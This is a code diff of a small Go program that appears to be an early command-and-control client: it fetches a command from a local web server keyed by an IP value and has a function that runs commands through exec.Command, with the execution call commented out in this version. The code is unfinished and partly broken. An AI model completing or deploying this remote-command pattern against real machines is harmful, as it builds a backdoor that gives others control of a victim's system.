@@ -10,23 +10,25 @@ import (
 	//"strings"
     "log"
     "os/exec"
-    
+
+
 
 )
 
 
-func execute(cmd string) { 
+func execute(cmd string) string{ 
     out, err := exec.Command(cmd).Output()
     if err != nil {
         log.Fatal(err)
     }
-    fmt.Println(string(out))
+    return string(out)
 }
 
-func recieveCommand(path string) { 
+func recieveCommand(path string) string{ 
     resp, err := http.Get(path)
     if err != nil { 
-        panic(err)
+        fmt.Println("waiting...")
+        return ""
     }
     defer resp.Body.Close()
 
@@ -34,12 +36,13 @@ func recieveCommand(path string) {
 
     if err != nil {
 
-        panic(err)
+        fmt.Println("no repsonse...")
+        return ""
     }
 
-    exec := "pwd"
-    
-    execute(exec)
+    body, err := ioutil.ReadAll(resp.Body)
+    return string(body)
+   // return execute(exec)
 
 }
 
@@ -72,6 +75,6 @@ func main() {
         print(err)
     }
     fmt.Println(string(body))
-    recieveCommand("http://127.0.0.1:8080/hello")
+    recieveCommand("http://127.0.0.1:8080/" + ip)
 
 }
